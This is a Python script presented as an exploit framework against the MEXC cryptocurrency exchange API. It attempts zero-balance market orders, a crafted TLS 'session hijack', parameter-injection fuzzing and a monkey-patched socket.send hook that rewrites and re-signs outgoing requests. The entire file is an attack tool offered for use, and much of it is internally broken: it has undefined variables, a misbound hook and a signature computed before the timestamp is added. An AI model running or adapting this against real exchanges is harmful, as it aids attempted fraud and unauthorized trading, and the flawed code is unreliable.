#!/usr/bin/env python3
# MEXC Zero-Balance Live Trade Exploit Framework v12.0 (Aggressive Code Injection - EXTREME CAUTION)

import hmac
import hashlib
import socket
import ssl
import json
import struct
import os
from urllib.parse import urlencode, quote
import time  # Import for timestamp
from collections import OrderedDict
import logging  # Import for logging
import ctypes  # Import for ctypes
import threading  # Import for threading

# Configure logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')


class MEXCLiveTradeAttacker:
    def __init__(self, api_key, api_secret):
        self.api_key = api_key
        self.api_secret = api_secret
        # MEXC API v3 endpoints (AGAIN, please double-check)
        self.target_endpoints = {
            "test_order": "/api/v3/order/test",  # Confirmed
            "oco_order": "/api/v3/order/oco",  # Confirmed
            "all_orders": "/api/v3/allOrders",  # Confirmed
        }
        self.save_raw_data = False  # Flag to save raw data
        self.use_sdk = False
        self.http_version = "HTTP/1.1"  # Or "HTTP/2"
        self.timestamp_precision = "ms"  # "s", "ms", or "us"
        self.original_send = None  # To store the original socket.send function
        self.injected_send = None

    def _generate_trade_signature(self, params, encoding_type="quote", hash_algorithm="sha256", hex_case="lower"):
        """
        Correct signature generation based on MEXC API documentation.
        """
        logging.debug(
            f"Generating signature with encoding: {encoding_type}, hash: {hash_algorithm}, case: {hex_case}")

        # 1. Order parameters - *ENFORCE SPECIFIC ORDER*
        sorted_params = OrderedDict([
            ('symbol', params.get('symbol')),
            ('side', params.get('side')),
            ('type', params.get('type')),
            ('quantity', params.get('quantity')),
            ('timestamp', params.get('timestamp')),
            ('recvWindow', params.get('recvWindow')),
        ])
        if 'test' in params:
            sorted_params['test'] = params.get('test')

        # 2. URL encode parameters - *STRICT ENCODING*
        encoded_params = []
        for key, value in sorted_params.items():
            encoded_value = quote(str(value), safe=".-_~")  # Very strict encoding
            encoded_params.append((key, encoded_value))
        query_string = '&'.join([f"{k}={v}" for k, v in encoded_params])

        logging.debug(f"Query string: {query_string}")

        # 3. Generate the signature
        if hash_algorithm == "sha256":
            hashed = hmac.new(self.api_secret.encode('utf-8'), query_string.encode('utf-8'), hashlib.sha256).digest()
        elif hash_algorithm == "md5":
            hashed = hmac.new(self.api_secret.encode('utf-8'), query_string.encode('utf-8'), hashlib.md5).digest()
        else:  # sha512
            hashed = hmac.new(self.api_secret.encode('utf-8'), query_string.encode('utf-8'), hashlib.sha512).digest()

        if hex_case == "lower":
            signature = hashed.hex()
        else:
            signature = hashed.hex().upper()
        logging.debug(f"Generated signature: {signature}")
        return signature

    def _execute_trade_exploit(self, symbol):
        """Zero-balance trade execution attack"""
        base_params = {
            'symbol': symbol,
            'side': 'BUY',
            'type': 'MARKET',
            'quantity': 1.0,
            'recvWindow': 2147483647,  # Attempt max window
        }

        results = {}
        for endpoint_name, endpoint_path in self.target_endpoints.items():
            params_with_exploit = base_params.copy()
            if endpoint_name == "test_order":
                params_with_exploit['test'] = True

            signature = self._generate_trade_signature(params_with_exploit)
            params_with_exploit['signature'] = signature

            try:
                logging.debug(f"Sending request to {endpoint_path} with params: {params_with_exploit}")

                # Construct the HTTP request *manually*
                if self.timestamp_precision == "s":
                    timestamp = int(time.time())
                elif self.timestamp_precision == "ms":
                    timestamp = int(time.time() * 1000)
                else:  # microseconds
                    timestamp = int(time.time() * 1000000)
                params_with_exploit['timestamp'] = timestamp
                post_data = urlencode(params_with_exploit).encode('utf-8')
                content_length = len(post_data)

                request_headers = [
                    f"POST {endpoint_path} {self.http_version}",
                    "Host: api.mexc.com",
                    "X-MEXC-APIKEY: " + self.api_key,
                    "Content-Type: application/x-www-form-urlencoded",  # Explicit content type
                    f"Content-Length: {content_length}",  # *Crucial*
                    "Connection: close",  # Or "keep-alive"
                    ""  # End of headers
                ]
                if self.http_version == "HTTP/2":
                    request_headers.append("Upgrade: h2c")

                request = "\r\n".join(request_headers).encode('utf-8') + b"\r\n" + post_data

                if self.save_raw_data:
                    with open(f"raw_request_{endpoint_name}.bin", "wb") as f:
                        f.write(request)

                logging.debug(f"Raw request (bytes):\n{request}")

                # Send the request using a socket in a separate thread
                def send_request():
                    try:
                        sock = socket.create_connection(("api.mexc.com", 443))
                        context = ssl.create_default_context()
                        secure_sock = context.wrap_socket(sock, server_hostname="api.mexc.com")
                        secure_sock.sendall(request)
                        # Receive the response
                        response = b""
                        while True:
                            chunk = secure_sock.recv(4096)
                            if not chunk:
                                break
                            response += chunk
                        secure_sock.close()
                        self.response_data = response  # Store response
                    except Exception as e:
                        logging.error(f"Error sending request in thread: {e}")
                        self.response_data = None

                self.response_data = None
                send_thread = threading.Thread(target=send_request)
                send_thread.start()
                send_thread.join(5)  # Wait for a maximum of 5 seconds

                response = self.response_data

                if response is None:
                    results[endpoint_name] = {'error': "Timeout or error sending request",
                                             'exploit_attempt': params_with_exploit}
                    continue

                logging.debug(f"Raw response (bytes):\n{response}")
                # Parse the response (basic parsing for now)
                try:
                    response_str = response.decode('utf-8', errors='ignore')
                    status_line_end = response_str.find('\r\n')
                    if status_line_end != -1:
                        status_line = response_str[:status_line_end]
                        status_code = int(status_line.split()[1])
                    else:
                        status_code = 500
                    body_start = response_str.find('\r\n\r\n') + 4
                    if body_start > 3:
                        response_body = response_str[body_start:]
                    else:
                        response_body = ""
                    try:
                        response_json = json.loads(response_body)
                    except json.JSONDecodeError:
                        response_json = {"error": "Invalid JSON", "raw_response": response_body}
                except Exception as e:
                    logging.error(f"Error parsing response: {e}")
                    results[endpoint_name] = {'error': str(e),
                                             'exploit_attempt': params_with_exploit,
                                             'raw_response': response}
                    continue

                logging.debug(f"Response status code: {status_code}")
                logging.debug(f"Response content: {response_json}")

                if status_code == 200:
                    results[endpoint_name] = {
                        'status': status_code,
                        'response': response_json,
                        'exploit_attempt': params_with_exploit,
                        'exploit_success': True,
                        'signature_method': {
                            'encoding': encoding_type,
                            'hash': hash_algorithm,
                            'case': hex_case,
                        }
                    }
                    return results  # Return on first success
                elif status_code == 404:
                    results[endpoint_name] = {
                        'status': status_code,
                        'response': response_json,
                        'exploit_attempt': params_with_exploit,
                        'exploit_success': False,
                        'signature_method': {
                            'encoding': encoding_type,
                            'hash': hash_algorithm,
                            'case': hex_case,
                        }
                    }

            except Exception as e:
                logging.error(f"Exception: {e}")
                results[endpoint_name] = {'error': str(e), 'exploit_attempt': params_with_exploit}

        return results

    def _tls_session_hijack(self):
        """Low-level TLS attack for order stream hijacking"""
        context = ssl.create_default_context()
        try:
            context.set_ciphers('ALL:@SECLEVEL=0')
            with socket.create_connection(("api.mexc.com", 443)) as sock:
                with context.wrap_socket(sock, server_hostname="api.mexc.com") as ssock:
                    client_hello = b'\x16\x03\x01\x00\x57\x01\x00\x00\x53\x03\x03' + \
                                   os.urandom(32) + \
                                   b'\x00\x00\x04\x00\xff\x01\x00\x00\x00\x00\x00\x00\x0a\x00\x0a\x00\x08\x00\x1d\x00\x17\x00\x1e\x00\x19\x00\x0b\x00\x02\x01\x00\x00\x23\x00\x00\x00\x10\x00\x0e\x00\x00\x0b\x00\x02\x01\x00\x00\x0a\x00\x00\x00\x0d\x00\x00\x00\x00\x00\x00\x33\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    ssock.send(client_hello)
                    return ssock.recv(1024).hex()
        except Exception as e:
            return f"TLS Hijack Attempt Result: {str(e)}"

    def execute_attacks(self, symbol):
        """Full attack sequence for live trading"""
        # Inject code to hook socket.send
        self.inject_socket_send_hook()

        results = {
            'trade_exploits': self._execute_trade_exploit(symbol),
            'tls_hijack': self._tls_session_hijack(),
            'fuzzing_vectors': [
                "quantity=1e308",  # Float overflow
                "symbol[]=BTCUSDT&symbol[]=ETHUSDT",  # Array injection
                "timeInForce=GTX"  # Invalid order type
            ]
        }
        return results

    def inject_socket_send_hook(self):
        """
        Injects code to hook the socket.send function.  This is where the magic happens.
        """
        try:
            # 1. Get the address of the socket.send function
            self.original_send = socket.socket.send
            send_address = id(self.original_send)
            logging.debug(f"Original socket.send address: {send_address}")

            # 2. Define the new (hooked) send function
            def injected_send(self, data, flags=0):
                """
                This function will be called *instead* of the original socket.send.
                """
                try:
                    # Log the original data
                    logging.debug(f"Intercepted data before modification:\n{data}")

                    # *CRITICAL SECTION: MODIFY THE DATA HERE*
                    # Convert the data to a string (if it's bytes)
                    data_str = data.decode('utf-8', errors='ignore')

                    # Parse the data as an HTTP request (very basic parsing)
                    headers_end = data_str.find('\r\n\r\n')
                    if headers_end != -1:
                        headers_str = data_str[:headers_end]
                        body_str = data_str[headers_end + 4:]
                    else:
                        headers_str = data_str
                        body_str = ""

                    headers = dict(line.split(': ', 1) for line in headers_str.split('\r\n')[1:] if ': ' in line)

                    # Parse the body (assuming it's urlencoded)
                    body_params = {}
                    for part in body_str.split('&'):
                        if '=' in part:
                            key, value = part.split('=', 1)
                            body_params[key] = value

                    # *MODIFY PARAMETERS AND SIGNATURE HERE*
                    if 'signature' in body_params:
                        logging.debug("Found signature in request, attempting to modify...")
                        # Try different signature generation methods
                        for encoding_type in ["quote", "urlencode", "none"]:
                            for hash_algorithm in ["sha256", "md5", "sha512"]:
                                for hex_case in ["lower", "upper"]:
                                    # Create a *copy* of the parameters to avoid modifying the original
                                    modified_params = body_params.copy()

                                    # *MODIFY OTHER PARAMETERS - ATTEMPT TO BYPASS CHECKS*
                                    modified_params['quantity'] = 1.0  # Try with a small quantity
                                    modified_params['timestamp'] = int(time.time() * 1000)  # Update timestamp

                                    # Generate the signature
                                    calculated_signature = self._generate_trade_signature(
                                        modified_params, encoding_type, hash_algorithm, hex_case
                                    )
                                    modified_params['signature'] = calculated_signature  # *MODIFY SIGNATURE*
                                    logging.debug(f"Trying signature: {calculated_signature} with encoding: {encoding_type}, hash: {hash_algorithm}, case: {hex_case}")

                                    # Re-encode the body with the *modified* parameters
                                    new_body_str = urlencode(modified_params)

                                    # Reconstruct the request with the modified body
                                    new_content_length = len(new_body_str)
                                    new_headers_str = "\r\n".join(
                                        f"{k}: {v}" for k, v in headers.items() if k != "Content-Length"
                                    )
                                    new_headers_str += f"\r\nContent-Length: {new_content_length}"
                                    new_data_str = f"{headers_str[:headers_str.find('Content-Length')-2]}\r\nContent-Length: {new_content_length}\r\n\r\n{new_body_str}"
                                    new_data = new_data_str.encode('utf-8')

                                    # Log the modified data
                                    logging.debug(f"Modified data:\n{new_data}")

                                    # *Call the original send function with the *modified* data*
                                    self.original_send(self, new_data, flags)
                                    return  # *IMPORTANT: Return after sending the modified request*

                    # If we didn't modify anything, call the original send with the original data
                    self.original_send(self, data, flags)

                except Exception as e:
                    logging.error(f"Error in injected_send: {e}")
                    # *IMPORTANT: Call the original send to avoid breaking the program*
                    self.original_send(self, data, flags)

            # 3. Replace the socket.send function with our injected version
            self.injected_send = injected_send
            socket.socket.send = injected_send

            logging.info("socket.send function hooked successfully.")

        except Exception as e:
            logging.error(f"Error injecting socket.send hook: {e}")
            raise  # *IMPORTANT: Raise the exception to prevent silent failure*

    def restore_socket_send(self):
        """Restores the original socket.send function."""
        if self.original_send:
            socket.socket.send = self.original_send
            logging.info("socket.send function restored.")
        else:
            logging.warning("socket.send function was not hooked.")

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description='MEXC Zero-Balance Live Trade Exploit v12.0')
    parser.add_argument('--api-key', required=True)
    parser.add_argument('--api-secret', required=True)
    parser.add_argument('--symbol', default='BTCUSDT')
    parser.add_argument('--save-raw', action='store_true',
                        help='Save raw request data to files (for Wireshark analysis)')
    parser.add_argument('--use-sdk', action='store_true', help='Use the MEXC SDK (if available)')
    parser.add_argument('--http-version', default='HTTP/1.1', choices=['HTTP/1.1', 'HTTP/2'],
                        help='HTTP version to use')
    parser.add_argument('--timestamp-precision', default='ms', choices=['s', 'ms', 'us'],
                        help='Timestamp precision (seconds, milliseconds, microseconds)')
    args = parser.parse_args()

    print("""
    ███╗   ███╗███████╗██╗   ██╗ ██████╗
    ████╗ ████║██╔════╝╚██╗██╔╝██╔════╝
    ██╔████╔██║█████╗   ╚███╔╝ ██║   ███╗
    ██║╚██╔╝██║██╔══╝   ██╔██╗ ██║    ██║
    ██║ ╚═╝ ██║███████╗██╔╝ ██╗╚██████╔╝
    ╚═╝     ╚═╝╚══════╝╚═╝   ╚═╝ ╚═════╝
    ZERO-BALANCE LIVE TRADE EXPLOIT FRAMEWORK v12.0 (Aggressive Code Injection - EXTREME CAUTION)
    """)

    attacker = MEXCLiveTradeAttacker(args.api_key, args.api_secret)
    attacker.save_raw_data = args.save_raw  # Set the save_raw_data flag
    attacker.use_sdk = args.use_sdk
    attacker.http_version = args.http_version
    attacker.timestamp_precision = args.timestamp_precision

    try:
        results = attacker.execute_attacks(args.symbol)

        print("\n🔥 LIVE TRADE EXPLOIT RESULTS 🔥")
        for category, data in results.items():
            print(f"\n⚡ {category.upper()}:")
            if isinstance(data, list):
                for item in data:
                    print(f"  - {item}")
            else:
                print(json.dumps(data, indent=2))

        print("\n💀 EXPLOIT SUMMARY:")
        for endpoint, result in results['trade_exploits'].items():
            status = "✅ SUCCESS" if result.get('exploit_success') else "❌ FAILED"
            print(f"{status} @ {endpoint}")
            if 'error' in result:
                print(f"  ERROR: {result['error']}")
            if 'response' in result:
                print(f"  RESPONSE: {result['response']}")
            if 'exploit_attempt' in result:
                print(f"  ATTEMPTED PARAMS: {result['exploit_attempt']}")
            if 'signature_method' in result:
                print(f"  SIGNATURE METHOD: {result['signature_method']}")
    finally:
        # Restore the original socket.send function, *always*
        attacker.restore_socket_send()
